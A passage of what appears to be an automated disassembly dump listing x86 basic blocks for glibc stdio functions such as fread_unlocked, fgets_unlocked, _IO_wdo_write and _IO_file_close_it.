v
0xb068e36:	mov	eax, dword ptr [ebp - 0x2c]
0xb068e39:	lea	esi, dword ptr [eax + 4]
0xb068e3c:	mov	dword ptr [ebp - 0x1c], esi
0xb068e3f:	mov	esi, dword ptr [eax]
0xb068e41:	mov	dword ptr [esp], esi
0xb068e44:	call	0xb07ae80
None
|
|
|
v
0xb068f92:	cmp	dword ptr [ebp - 0x1c], edi
0xb068f95:	jg	0xb068f76
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__libc_fatal
TOTAL BLOCKS :4
0xb069000:	mov	dword ptr [esp + 8], edi
0xb069004:	mov	dword ptr [esp + 4], esi
0xb069008:	mov	dword ptr [esp], 1
0xb06900f:	call	0xb068d40
None
|
|
|
v
0xb069014:	jmp	0xb069000
None
|
|
|
v
0xb068fe0:	push	edi
0xb068fe1:	push	esi
0xb068fe2:	push	ebx
0xb068fe3:	call	0xb1267db
None
|
|
|
v
0xb068fe8:	add	ebx, 0x142018
0xb068fee:	sub	esp, 0x10
0xb068ff1:	mov	edi, dword ptr [esp + 0x20]
0xb068ff5:	lea	esi, dword ptr [ebx - 0x47d3b]
0xb068ffb:	nop	
0xb068ffc:	lea	esi, dword ptr [esi]
0xb069000:	mov	dword ptr [esp + 8], edi
0xb069004:	mov	dword ptr [esp + 4], esi
0xb069008:	mov	dword ptr [esp], 1
0xb06900f:	call	0xb068d40
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fread_unlocked
TOTAL BLOCKS :5
0xb069728:	mov	edx, eax
0xb06972a:	mov	eax, edi
0xb06972c:	cmp	esi, edx
0xb06972e:	je	0xb069706
None
|
|
|
v
0xb0696f0:	push	edi
0xb0696f1:	xor	eax, eax
0xb0696f3:	push	esi
0xb0696f4:	sub	esp, 0x14
0xb0696f7:	mov	edi, dword ptr [esp + 0x28]
0xb0696fb:	mov	esi, dword ptr [esp + 0x24]
0xb0696ff:	imul	esi, edi
0xb069702:	test	esi, esi
0xb069704:	jne	0xb069710
None
|
|
|
v
0xb069710:	mov	eax, dword ptr [esp + 0x20]
0xb069714:	mov	dword ptr [esp + 8], esi
0xb069718:	mov	dword ptr [esp + 4], eax
0xb06971c:	mov	eax, dword ptr [esp + 0x2c]
0xb069720:	mov	dword ptr [esp], eax
0xb069723:	call	0xb070dd0
None
|
|
|
v
0xb069730:	mov	eax, edx
0xb069732:	xor	edx, edx
0xb069734:	div	dword ptr [esp + 0x24]
0xb069738:	add	esp, 0x14
0xb06973b:	pop	esi
0xb06973c:	pop	edi
0xb06973d:	ret	
None
|
|
|
v
0xb069706:	add	esp, 0x14
0xb069709:	pop	esi
0xb06970a:	pop	edi
0xb06970b:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:fgets_unlocked
TOTAL BLOCKS :13
0xb06984a:	add	esp, 0x2c
0xb06984d:	pop	ebx
0xb06984e:	pop	esi
0xb06984f:	pop	edi
0xb069850:	pop	ebp
0xb069851:	ret	
None
|
|
|
v
0xb069870:	mov	byte ptr [edi + eax], 0
0xb069874:	mov	edx, dword ptr [esi]
0xb069876:	jmp	0xb069842
None
|
|
|
v
0xb069842:	or	edx, dword ptr [esp + 0x1c]
0xb069846:	mov	eax, edi
0xb069848:	mov	dword ptr [esi], edx
0xb06984a:	add	esp, 0x2c
0xb06984d:	pop	ebx
0xb06984e:	pop	esi
0xb06984f:	pop	edi
0xb069850:	pop	ebp
0xb069851:	ret	
None
|
|
|
v
0xb06987c:	mov	byte ptr [edi], 0
0xb06987f:	mov	eax, edi
0xb069881:	jmp	0xb06984a
None
|
|
|
v
0xb06985d:	mov	ecx, dword ptr gs:[0]
0xb069864:	mov	ebp, dword ptr [ebx - 0xdc]
0xb06986a:	cmp	dword ptr [ecx + ebp], 0xb
0xb06986e:	jne	0xb069840
None
|
|
|
v
0xb069858:	test	dl, 0x20
0xb06985b:	je	0xb069870
None
|
|
|
v
0xb069840:	xor	edi, edi
0xb069842:	or	edx, dword ptr [esp + 0x1c]
0xb069846:	mov	eax, edi
0xb069848:	mov	dword ptr [esi], edx
0xb06984a:	add	esp, 0x2c
0xb06984d:	pop	ebx
0xb06984e:	pop	esi
0xb06984f:	pop	edi
0xb069850:	pop	ebp
0xb069851:	ret	
None
|
|
|
v
0xb069878:	xor	eax, eax
0xb06987a:	jmp	0xb06984a
None
|
|
|
v
0xb069807:	mov	edx, dword ptr [esi]
0xb069809:	sub	eax, 1
0xb06980c:	mov	ebp, edx
0xb06980e:	and	edx, 0xffffffdf
0xb069811:	mov	dword ptr [esi], edx
0xb069813:	and	ebp, 0x20
0xb069816:	mov	dword ptr [esp + 0x10], 1
0xb06981e:	mov	dword ptr [esp + 0xc], 0xa
0xb069826:	mov	dword ptr [esp + 8], eax
0xb06982a:	mov	dword ptr [esp + 4], edi
0xb06982e:	mov	dword ptr [esp], esi
0xb069831:	mov	dword ptr [esp + 0x1c], ebp
0xb069835:	call	0xb064e20
None
|
|
|
v
0xb0697e0:	push	ebp
0xb0697e1:	push	edi
0xb0697e2:	push	esi
0xb0697e3:	push	ebx
0xb0697e4:	sub	esp, 0x2c
0xb0697e7:	mov	eax, dword ptr [esp + 0x44]
0xb0697eb:	call	0xb1267db
None
|
|
|
v
0xb069802:	cmp	eax, 1
0xb069805:	je	0xb06987c
None
|
|
|
v
0xb06983a:	mov	edx, dword ptr [esi]
0xb06983c:	test	eax, eax
0xb06983e:	jne	0xb069858
None
|
|
|
v
0xb0697f0:	add	ebx, 0x141810
0xb0697f6:	mov	edi, dword ptr [esp + 0x40]
0xb0697fa:	mov	esi, dword ptr [esp + 0x48]
0xb0697fe:	test	eax, eax
0xb069800:	jle	0xb069878
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0699f0
TOTAL BLOCKS :18
0xb069a38:	mov	dword ptr [eax], esi
0xb069a3a:	sub	eax, 4
0xb069a3d:	cmp	eax, edx
0xb069a3f:	jne	0xb069a38
None
|
|
|
v
0xb069aa4:	movsx	eax, byte ptr [ebp + 0x46]
0xb069aa8:	mov	ecx, dword ptr [esp + 0x18]
0xb069aac:	mov	eax, dword ptr [ebp + eax + 0x94]
0xb069ab3:	mov	dword ptr [esp + 8], edi
0xb069ab7:	mov	dword ptr [esp], ebp
0xb069aba:	mov	dword ptr [esp + 4], ecx
0xb069abe:	call	dword ptr [eax + 0x1c]
None
|
|
|
v
0xb069a90:	add	esp, 0x6c
0xb069a93:	mov	eax, esi
0xb069a95:	pop	ebx
0xb069a96:	pop	esi
0xb069a97:	pop	edi
0xb069a98:	pop	ebp
0xb069a99:	ret	
None
|
|
|
v
0xb069ae0:	lea	eax, dword ptr [ebx - 0x4f2a0]
0xb069ae6:	mov	dword ptr [esp + 0x18], eax
0xb069aea:	jmp	0xb069a49
None
|
|
|
v
0xb069a68:	movsx	eax, byte ptr [ebp + 0x46]
0xb069a6c:	mov	ecx, dword ptr [esp + 0x1c]
0xb069a70:	mov	edx, dword ptr [esp + 0x18]
0xb069a74:	mov	eax, dword ptr [ecx + eax]
0xb069a77:	mov	dword ptr [esp + 8], 0x10
0xb069a7f:	mov	dword ptr [esp + 4], edx
0xb069a83:	mov	dword ptr [esp], ebp
0xb069a86:	call	dword ptr [eax + 0x1c]
None
|
|
|
v
0xb069a41:	lea	eax, dword ptr [esp + 0x20]
0xb069a45:	mov	dword ptr [esp + 0x18], eax
0xb069a49:	cmp	edi, 0xf
0xb069a4c:	jle	0xb069a9a
None
|
|
|
v
0xb069a4e:	lea	eax, dword ptr [ebp + 0x94]
0xb069a54:	xor	esi, esi
0xb069a56:	mov	dword ptr [esp + 0x1c], eax
0xb069a5a:	jmp	0xb069a68
None
|
|
|
v
0xb069aa0:	test	edi, edi
0xb069aa2:	jle	0xb069a90
None
|
|
|
v
0xb069a9a:	xor	esi, esi
0xb069a9c:	lea	esi, dword ptr [esi]
0xb069aa0:	test	edi, edi
0xb069aa2:	jle	0xb069a90
None
|
|
|
v
0xb069ac1:	add	esp, 0x6c
0xb069ac4:	pop	ebx
0xb069ac5:	add	esi, eax
0xb069ac7:	mov	eax, esi
0xb069ac9:	pop	esi
0xb069aca:	pop	edi
0xb069acb:	pop	ebp
0xb069acc:	ret	
None
|
|
|
v
0xb069ad0:	lea	eax, dword ptr [ebx - 0x4f260]
0xb069ad6:	mov	dword ptr [esp + 0x18], eax
0xb069ada:	jmp	0xb069a49
None
|
|
|
v
0xb069a03:	add	ebx, 0x1415fd
0xb069a09:	mov	ebp, dword ptr [esp + 0x80]
0xb069a10:	mov	edi, dword ptr [esp + 0x88]
0xb069a17:	cmp	esi, 0x20
0xb069a1a:	je	0xb069ad0
None
|
|
|
v
0xb069a20:	cmp	esi, 0x30
0xb069a23:	je	0xb069ae0
None
|
|
|
v
0xb069a49:	cmp	edi, 0xf
0xb069a4c:	jle	0xb069a9a
None
|
|
|
v
0xb0699f0:	push	ebp
0xb0699f1:	push	edi
0xb0699f2:	push	esi
0xb0699f3:	push	ebx
0xb0699f4:	sub	esp, 0x6c
0xb0699f7:	mov	esi, dword ptr [esp + 0x84]
0xb0699fe:	call	0xb1267db
None
|
|
|
v
0xb069a60:	sub	edi, 0x10
0xb069a63:	cmp	edi, 0xf
0xb069a66:	jle	0xb069aa0
None
|
|
|
v
0xb069a29:	lea	eax, dword ptr [esp + 0x5c]
0xb069a2d:	lea	edx, dword ptr [esp + 0x1c]
0xb069a31:	lea	esi, dword ptr [esi]
0xb069a38:	mov	dword ptr [eax], esi
0xb069a3a:	sub	eax, 4
0xb069a3d:	cmp	eax, edx
0xb069a3f:	jne	0xb069a38
None
|
|
|
v
0xb069a89:	add	esi, eax
0xb069a8b:	cmp	eax, 0x10
0xb069a8e:	je	0xb069a60
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_wsetb
TOTAL BLOCKS :8
0xb06a071:	test	dl, 8
0xb06a074:	je	0xb06a0a8
None
|
|
|
v
0xb06a076:	mov	ecx, dword ptr [esp + 0x24]
0xb06a07a:	mov	dword ptr [eax + 0x18], ecx
0xb06a07d:	mov	ecx, dword ptr [esp + 0x28]
0xb06a081:	mov	dword ptr [eax + 0x1c], ecx
0xb06a084:	mov	eax, dword ptr [esp + 0x2c]
0xb06a088:	test	eax, eax
0xb06a08a:	jne	0xb06a098
None
|
|
|
v
0xb06a08c:	or	edx, 8
0xb06a08f:	mov	dword ptr [esi + 0x3c], edx
0xb06a092:	add	esp, 0x14
0xb06a095:	pop	ebx
0xb06a096:	pop	esi
0xb06a097:	ret	
None
|
|
|
v
0xb06a0c3:	mov	eax, dword ptr [esi + 0x58]
0xb06a0c6:	mov	edx, dword ptr [esi + 0x3c]
0xb06a0c9:	jmp	0xb06a076
None
|
|
|
v
0xb06a098:	and	edx, 0xfffffff7
0xb06a09b:	mov	dword ptr [esi + 0x3c], edx
0xb06a09e:	add	esp, 0x14
0xb06a0a1:	pop	ebx
0xb06a0a2:	pop	esi
0xb06a0a3:	ret	
None
|
|
|
v
0xb06a05e:	add	ebx, 0x140fa2
0xb06a064:	mov	eax, dword ptr [esi + 0x58]
0xb06a067:	mov	edx, dword ptr [esi + 0x3c]
0xb06a06a:	mov	ecx, dword ptr [eax + 0x18]
0xb06a06d:	test	ecx, ecx
0xb06a06f:	je	0xb06a076
None
|
|
|
v
0xb06a050:	push	esi
0xb06a051:	push	ebx
0xb06a052:	sub	esp, 0x14
0xb06a055:	mov	esi, dword ptr [esp + 0x20]
0xb06a059:	call	0xb1267db
None
|
|
|
v
0xb06a0a8:	mov	eax, dword ptr [eax + 0x1c]
0xb06a0ab:	mov	dword ptr [esp], ecx
0xb06a0ae:	sub	eax, ecx
0xb06a0b0:	add	eax, 0xfff
0xb06a0b5:	and	eax, 0xfffff000
0xb06a0ba:	mov	dword ptr [esp + 4], eax
0xb06a0be:	call	0xb0e7410
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__woverflow
TOTAL BLOCKS :5
0xb06a33b:	mov	dword ptr [esp + 4], 1
0xb06a343:	mov	dword ptr [esp], esi
0xb06a346:	call	0xb066ae0
None
|
|
|
v
0xb06a320:	push	esi
0xb06a321:	push	ebx
0xb06a322:	sub	esp, 0x14
0xb06a325:	mov	esi, dword ptr [esp + 0x20]
0xb06a329:	call	0xb1267db
None
|
|
|
v
0xb06a34b:	movsx	eax, byte ptr [esi + 0x46]
0xb06a34f:	mov	edx, dword ptr [esp + 0x24]
0xb06a353:	mov	eax, dword ptr [esi + eax + 0x94]
0xb06a35a:	mov	dword ptr [esp], esi
0xb06a35d:	mov	dword ptr [esp + 4], edx
0xb06a361:	call	dword ptr [eax + 0xc]
None
|
|
|
v
0xb06a364:	add	esp, 0x14
0xb06a367:	pop	ebx
0xb06a368:	pop	esi
0xb06a369:	ret	
None
|
|
|
v
0xb06a32e:	add	ebx, 0x140cd2
0xb06a334:	mov	eax, dword ptr [esi + 0x68]
0xb06a337:	test	eax, eax
0xb06a339:	jne	0xb06a34b
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_free_wbackup_area
TOTAL BLOCKS :6
0xb06a617:	mov	eax, dword ptr [esi + 0x58]
0xb06a61a:	mov	dword ptr [eax + 0x20], 0
0xb06a621:	mov	dword ptr [eax + 0x28], 0
0xb06a628:	mov	dword ptr [eax + 0x24], 0
0xb06a62f:	add	esp, 0x14
0xb06a632:	pop	ebx
0xb06a633:	pop	esi
0xb06a634:	ret	
None
|
|
|
v
0xb06a638:	mov	eax, dword ptr [esi + 0x58]
0xb06a63b:	mov	eax, dword ptr [eax + 0x20]
0xb06a63e:	jmp	0xb06a60f
None
|
|
|
v
0xb06a60f:	mov	dword ptr [esp], eax
0xb06a612:	call	0xb017470
None
|
|
|
v
0xb06a5d0:	push	esi
0xb06a5d1:	push	ebx
0xb06a5d2:	sub	esp, 0x14
0xb06a5d5:	mov	esi, dword ptr [esp + 0x20]
0xb06a5d9:	call	0xb1267db
None
|
|
|
v
0xb06a5eb:	and	ah, 0xfe
0xb06a5ee:	mov	dword ptr [esi], eax
0xb06a5f0:	mov	eax, dword ptr [esi + 0x58]
0xb06a5f3:	mov	edx, dword ptr [eax + 4]
0xb06a5f6:	mov	ecx, dword ptr [eax + 0x28]
0xb06a5f9:	mov	dword ptr [eax + 0x28], edx
0xb06a5fc:	mov	edx, dword ptr [eax + 8]
0xb06a5ff:	mov	dword ptr [eax + 4], ecx
0xb06a602:	mov	ecx, dword ptr [eax + 0x20]
0xb06a605:	mov	dword ptr [eax + 0x20], edx
0xb06a608:	mov	dword ptr [eax + 8], ecx
0xb06a60b:	mov	dword ptr [eax], ecx
0xb06a60d:	mov	eax, edx
0xb06a60f:	mov	dword ptr [esp], eax
0xb06a612:	call	0xb017470
None
|
|
|
v
0xb06a5de:	add	ebx, 0x140a22
0xb06a5e4:	mov	eax, dword ptr [esi]
0xb06a5e6:	test	ah, 1
0xb06a5e9:	je	0xb06a638
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_wdo_write
TOTAL BLOCKS :22
0xb06c52a:	cmp	eax, 0xff
0xb06c52d:	je	0xb06c4fe
None
|
|
|
v
0xb06c414:	add	ebx, 0x13ebec
0xb06c41a:	mov	ebp, dword ptr [esp + 0x64]
0xb06c41e:	mov	eax, dword ptr [esi + 0x54]
0xb06c421:	test	edi, edi
0xb06c423:	mov	dword ptr [esp + 0x24], eax
0xb06c427:	je	0xb06c4dd
None
|
|
|
v
0xb06c439:	lea	eax, dword ptr [esi + 0x14]
0xb06c43c:	mov	dword ptr [esp + 0x28], eax
0xb06c440:	lea	eax, dword ptr [esp + 0x3c]
0xb06c444:	mov	dword ptr [esp + 0x2c], eax
0xb06c448:	jmp	0xb06c455
None
|
|
|
v
0xb06c400:	push	ebp
0xb06c401:	push	edi
0xb06c402:	push	esi
0xb06c403:	push	ebx
0xb06c404:	sub	esp, 0x4c
0xb06c407:	mov	esi, dword ptr [esp + 0x60]
0xb06c40b:	mov	edi, dword ptr [esp + 0x68]
0xb06c40f:	call	0xb1267db
None
|
|
|
v
0xb06c4dd:	xor	eax, eax
0xb06c4df:	mov	edx, dword ptr [esi + 0x58]
0xb06c4e2:	test	dword ptr [esi], 0x202
0xb06c4e8:	mov	ecx, dword ptr [edx + 0x18]
0xb06c4eb:	mov	dword ptr [edx + 8], ecx
0xb06c4ee:	mov	dword ptr [edx], ecx
0xb06c4f0:	mov	dword ptr [edx + 4], ecx
0xb06c4f3:	mov	dword ptr [edx + 0x10], ecx
0xb06c4f6:	mov	dword ptr [edx + 0xc], ecx
0xb06c4f9:	je	0xb06c508
None
|
|
|
v
0xb06c490:	mov	edx, dword ptr [esi + 0x10]
0xb06c493:	mov	dword ptr [esp + 0x20], eax
0xb06c497:	mov	eax, dword ptr [esi + 0x14]
0xb06c49a:	mov	dword ptr [esp + 4], edx
0xb06c49e:	mov	dword ptr [esp], esi
0xb06c4a1:	sub	eax, edx
0xb06c4a3:	mov	dword ptr [esp + 8], eax
0xb06c4a7:	call	0xb06fcb0
None
|
|
|
v
0xb06c508:	mov	ecx, dword ptr [edx + 0x1c]
0xb06c50b:	jmp	0xb06c4fb
None
|
|
|
v
0xb06c4df:	mov	edx, dword ptr [esi + 0x58]
0xb06c4e2:	test	dword ptr [esi], 0x202
0xb06c4e8:	mov	ecx, dword ptr [edx + 0x18]
0xb06c4eb:	mov	dword ptr [edx + 8], ecx
0xb06c4ee:	mov	dword ptr [edx], ecx
0xb06c4f0:	mov	dword ptr [edx + 4], ecx
0xb06c4f3:	mov	dword ptr [edx + 0x10], ecx
0xb06c4f6:	mov	dword ptr [edx + 0xc], ecx
0xb06c4f9:	je	0xb06c508
None
|
|
|
v
0xb06c518:	sub	edx, eax
0xb06c51a:	mov	dword ptr [esp + 8], edx
0xb06c51e:	mov	dword ptr [esp + 4], eax
0xb06c522:	mov	dword ptr [esp], esi
0xb06c525:	call	0xb06fcb0
None
|
|
|
v
0xb06c455:	mov	eax, dword ptr [esp + 0x28]
0xb06c459:	mov	dword ptr [esp + 0x1c], eax
0xb06c45d:	mov	eax, dword ptr [esi + 0x20]
0xb06c460:	mov	dword ptr [esp + 0x14], edx
0xb06c464:	mov	dword ptr [esp + 8], ebp
0xb06c468:	mov	dword ptr [esp + 0x18], eax
0xb06c46c:	mov	eax, dword ptr [esp + 0x2c]
0xb06c470:	mov	dword ptr [esp + 0x10], eax
0xb06c474:	lea	eax, dword ptr [ebp + edi*4]
0xb06c478:	mov	dword ptr [esp + 0xc], eax
0xb06c47c:	mov	eax, dword ptr [esi + 0x58]
0xb06c47f:	add	eax, 0x2c
0xb06c482:	mov	dword ptr [esp + 4], eax
0xb06c486:	mov	eax, dword ptr [esp + 0x24]
0xb06c48a:	mov	dword ptr [esp], eax
0xb06c48d:	call	dword ptr [eax + 4]
None
|
|
|
v
0xb06c4ac:	cmp	eax, 0xff
0xb06c4af:	je	0xb06c4fe
None
|
|
|
v
0xb06c52f:	mov	edx, dword ptr [esi + 0x14]
0xb06c532:	jmp	0xb06c439
None
|
|
|
v
0xb06c50d:	mov	eax, dword ptr [esi + 0x10]
0xb06c510:	cmp	edx, eax
0xb06c512:	je	0xb06c439
None
|
|
|
v
0xb06c42d:	mov	edx, dword ptr [esi + 0x14]
0xb06c430:	cmp	dword ptr [esi + 0x18], edx
0xb06c433:	je	0xb06c50d
None
|
|
|
v
0xb06c450:	mov	edx, dword ptr [esi + 0x14]
0xb06c453:	mov	ebp, eax
0xb06c455:	mov	eax, dword ptr [esp + 0x28]
0xb06c459:	mov	dword ptr [esp + 0x1c], eax
0xb06c45d:	mov	eax, dword ptr [esi + 0x20]
0xb06c460:	mov	dword ptr [esp + 0x14], edx
0xb06c464:	mov	dword ptr [esp + 8], ebp
0xb06c468:	mov	dword ptr [esp + 0x18], eax
0xb06c46c:	mov	eax, dword ptr [esp + 0x2c]
0xb06c470:	mov	dword ptr [esp + 0x10], eax
0xb06c474:	lea	eax, dword ptr [ebp + edi*4]
0xb06c478:	mov	dword ptr [esp + 0xc], eax
0xb06c47c:	mov	eax, dword ptr [esi + 0x58]
0xb06c47f:	add	eax, 0x2c
0xb06c482:	mov	dword ptr [esp + 4], eax
0xb06c486:	mov	eax, dword ptr [esp + 0x24]
0xb06c48a:	mov	dword ptr [esp], eax
0xb06c48d:	call	dword ptr [eax + 4]
None
|
|
|
v
0xb06c4cd:	add	edx, 3
0xb06c4d0:	cmp	edx, 6
0xb06c4d3:	jbe	0xb06c538
None
|
|
|
v
0xb06c4b1:	mov	eax, dword ptr [esp + 0x3c]
0xb06c4b5:	mov	ecx, dword ptr [esp + 0x20]
0xb06c4b9:	mov	edx, eax
0xb06c4bb:	sub	edx, ebp
0xb06c4bd:	mov	ebp, edx
0xb06c4bf:	sar	ebp, 2
0xb06c4c2:	sub	edi, ebp
0xb06c4c4:	test	ecx, ecx
0xb06c4c6:	je	0xb06c4d5
None
|
|
|
v
0xb06c4c8:	cmp	ecx, 1
0xb06c4cb:	jne	0xb06c538
None
|
|
|
v
0xb06c4fe:	add	esp, 0x4c
0xb06c501:	pop	ebx
0xb06c502:	pop	esi
0xb06c503:	pop	edi
0xb06c504:	pop	ebp
0xb06c505:	ret	
None
|
|
|
v
0xb06c4d5:	test	edi, edi
0xb06c4d7:	jne	0xb06c450
None
|
|
|
v
0xb06c4fb:	mov	dword ptr [edx + 0x14], ecx
0xb06c4fe:	add	esp, 0x4c
0xb06c501:	pop	ebx
0xb06c502:	pop	esi
0xb06c503:	pop	edi
0xb06c504:	pop	ebp
0xb06c505:	ret	
None
|
|
|
v
0xb06c538:	xor	eax, eax
0xb06c53a:	test	edi, edi
0xb06c53c:	setne	al
0xb06c53f:	neg	eax
0xb06c541:	jmp	0xb06c4df
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b06df20
TOTAL BLOCKS :18
0xb06e01c:	jmp	0xb06df87
None
|
|
|
v
0xb06df5f:	mov	edi, eax
0xb06df61:	movzx	eax, word ptr [esi + 0x44]
0xb06df65:	test	ax, ax
0xb06df68:	jne	0xb06dfe8
None
|
|
|
v
0xb06df32:	mov	dword ptr [eax + 0x4c], 0xffffffff
0xb06df39:	lea	edi, dword ptr [eax + 0x94]
0xb06df3f:	mov	dword ptr [eax + 0x50], 0xffffffff
0xb06df46:	movsx	eax, byte ptr [esi + 0x46]
0xb06df4a:	mov	edx, dword ptr [esp + 0x20]
0xb06df4e:	mov	eax, dword ptr [edi + eax]
0xb06df51:	mov	dword ptr [esp + 8], edx
0xb06df55:	mov	dword ptr [esp + 4], ebp
0xb06df59:	mov	dword ptr [esp], esi
0xb06df5c:	call	dword ptr [eax + 0x3c]
None
|
|
|
v
0xb06e003:	add	eax, 1
0xb06e006:	mov	word ptr [esi + 0x44], ax
0xb06e00a:	jmp	0xb06df6a
None
|
|
|
v
0xb06dff0:	sub	eax, 1
0xb06dff3:	mov	dword ptr [esp + 8], edi
0xb06dff7:	mov	dword ptr [esp + 4], ebp
0xb06dffb:	mov	dword ptr [esp], eax
0xb06dffe:	call	0xb071310
None
|
|
|
v
0xb06dfd7:	mov	dword ptr [esi + 0x4c], eax
0xb06dfda:	mov	dword ptr [esi + 0x50], edx
0xb06dfdd:	jmp	0xb06df46
None
|
|
|
v
0xb06df8a:	mov	dword ptr [esi + 0x18], edx
0xb06df8d:	mov	eax, edi
0xb06df8f:	add	esp, 0x10
0xb06df92:	pop	esi
0xb06df93:	pop	edi
0xb06df94:	pop	ebp
0xb06df95:	ret	
None
|
|
|
v
0xb06df98:	mov	eax, dword ptr [eax + 8]
0xb06df9b:	lea	edi, dword ptr [esi + 0x94]
0xb06dfa1:	mov	edx, dword ptr [esi + 0x10]
0xb06dfa4:	cmp	eax, edx
0xb06dfa6:	je	0xb06df46
None
|
|
|
v
0xb06df20:	push	ebp
0xb06df21:	mov	ebp, edx
0xb06df23:	push	edi
0xb06df24:	push	esi
0xb06df25:	mov	esi, eax
0xb06df27:	sub	esp, 0x10
0xb06df2a:	test	dword ptr [eax], 0x1000
0xb06df30:	je	0xb06df98
None
|
|
|
v
0xb06df87:	mov	edx, dword ptr [esi + 0x20]
0xb06df8a:	mov	dword ptr [esi + 0x18], edx
0xb06df8d:	mov	eax, edi
0xb06df8f:	add	esp, 0x10
0xb06df92:	pop	esi
0xb06df93:	pop	edi
0xb06df94:	pop	ebp
0xb06df95:	ret	
None
|
|
|
v
0xb06df46:	movsx	eax, byte ptr [esi + 0x46]
0xb06df4a:	mov	edx, dword ptr [esp + 0x20]
0xb06df4e:	mov	eax, dword ptr [edi + eax]
0xb06df51:	mov	dword ptr [esp + 8], edx
0xb06df55:	mov	dword ptr [esp + 4], ebp
0xb06df59:	mov	dword ptr [esp], esi
0xb06df5c:	call	dword ptr [eax + 0x3c]
None
|
|
|
v
0xb06dfe8:	test	edi, edi
0xb06dfea:	je	0xb06df6a
None
|
|
|
v
0xb06df8f:	add	esp, 0x10
0xb06df92:	pop	esi
0xb06df93:	pop	edi
0xb06df94:	pop	ebp
0xb06df95:	ret	
None
|
|
|
v
0xb06e028:	xor	eax, eax
0xb06e02a:	jmp	0xb06df8f
None
|
|
|
v
0xb06dfa8:	movsx	ecx, byte ptr [esi + 0x46]
0xb06dfac:	sub	edx, eax
0xb06dfae:	mov	ecx, dword ptr [esi + ecx + 0x94]
0xb06dfb5:	mov	dword ptr [esp + 4], edx
0xb06dfb9:	sar	edx, 0x1f
0xb06dfbc:	mov	dword ptr [esp + 0xc], 1
0xb06dfc4:	mov	dword ptr [esp + 8], edx
0xb06dfc8:	mov	dword ptr [esp], esi
0xb06dfcb:	call	dword ptr [ecx + 0x40]
None
|
|
|
v
0xb06dfce:	mov	ecx, eax
0xb06dfd0:	and	ecx, edx
0xb06dfd2:	cmp	ecx, 0xff
0xb06dfd5:	je	0xb06e028
None
|
|
|
v
0xb06df6a:	mov	eax, dword ptr [esi + 0x68]
0xb06df6d:	mov	edx, dword ptr [esi + 0x1c]
0xb06df70:	test	eax, eax
0xb06df72:	mov	dword ptr [esi + 0xc], edx
0xb06df75:	mov	dword ptr [esi + 4], edx
0xb06df78:	mov	dword ptr [esi + 8], edx
0xb06df7b:	mov	dword ptr [esi + 0x14], edx
0xb06df7e:	mov	dword ptr [esi + 0x10], edx
0xb06df81:	jle	0xb06e010
None
|
|
|
v
0xb06e010:	test	dword ptr [esi], 0x202
0xb06e016:	jne	0xb06df8a
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_file_init
TOTAL BLOCKS :2
0xb06f414:	mov	dword ptr [esi + 0x38], 0xffffffff
0xb06f41b:	add	esp, 0x18
0xb06f41e:	pop	esi
0xb06f41f:	ret	
None
|
|
|
v
0xb06f3f0:	push	esi
0xb06f3f1:	sub	esp, 0x18
0xb06f3f4:	mov	esi, dword ptr [esp + 0x20]
0xb06f3f8:	or	dword ptr [esi], 0x240c
0xb06f3fe:	mov	dword ptr [esi + 0x4c], 0xffffffff
0xb06f405:	mov	dword ptr [esi + 0x50], 0xffffffff
0xb06f40c:	mov	dword ptr [esp], esi
0xb06f40f:	call	0xb0703d0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:_IO_file_close_it
TOTAL BLOCKS :20
0xb06f420:	push	ebp
0xb06f421:	push	edi
0xb06f422:	push	esi
0xb06f423:	sub	esp, 0x10
0xb06f426:	mov	esi, dword ptr [esp + 0x20]
0xb06f42a:	mov	eax, dword ptr [esi + 0x38]
0xb06f42d:	cmp	eax, 0xff
0xb06f430:	je	0xb06f537
None
|
|
|
v
0xb06f588:	mov	eax, dword ptr [esi + 0x10]
0xb06f58b:	mov	edx, dword ptr [esi + 0x14]
0xb06f58e:	mov	dword ptr [esp], esi
0xb06f591:	mov	dword ptr [esp + 4], eax
0xb06f595:	sub	edx, eax
0xb06f597:	mov	dword ptr [esp + 8], edx
0xb06f59b:	call	0xb06fcb0
None
|
|
|
v
0xb06f465:	mov	eax, dword ptr [esi + 0x58]
0xb06f468:	mov	eax, dword ptr [eax + 0x20]
0xb06f46b:	test	eax, eax
0xb06f46d:	je	0xb06f477
None
|
|
|
v
0xb06f558:	mov	ecx, dword ptr [esi + 0x68]
0xb06f55b:	test	ecx, ecx
0xb06f55d:	jle	0xb06f588
None
|
|
|
v
0xb06f44a:	mov	dword ptr [esp], esi
0xb06f44d:	xor	edi, edi
0xb06f44f:	call	0xb071ab0
None
|
|
|
v
0xb06f4c3:	mov	dword ptr [esp + 0xc], 0
0xb06f4cb:	mov	dword ptr [esp + 8], 0
0xb06f4d3:	mov	dword ptr [esp + 4], 0
0xb06f4db:	mov	dword ptr [esp], esi
0xb06f4de:	call	0xb070bd0
None
|
|
|
v
0xb06f551:	mov	edi, eax
0xb06f553:	jmp	0xb06f45e
None
|
|
|
v
0xb06f5a0:	mov	ebp, eax
0xb06f5a2:	jmp	0xb06f44a
None
|
|
|
v
0xb06f436:	mov	eax, dword ptr [esi]
0xb06f438:	xor	ebp, ebp
0xb06f43a:	and	eax, 0x808
0xb06f43f:	cmp	eax, 0x800
0xb06f444:	je	0xb06f558
None
|
|
|
v
0xb06f540:	movsx	eax, byte ptr [esi + 0x46]
0xb06f544:	mov	eax, dword ptr [esi + eax + 0x94]
0xb06f54b:	mov	dword ptr [esp], esi
0xb06f54e:	call	dword ptr [eax + 0x44]
None
|
|
|
v
0xb06f454:	test	byte ptr [esi + 0x3c], 0x20
0xb06f458:	je	0xb06f540
None
|
|
|
v
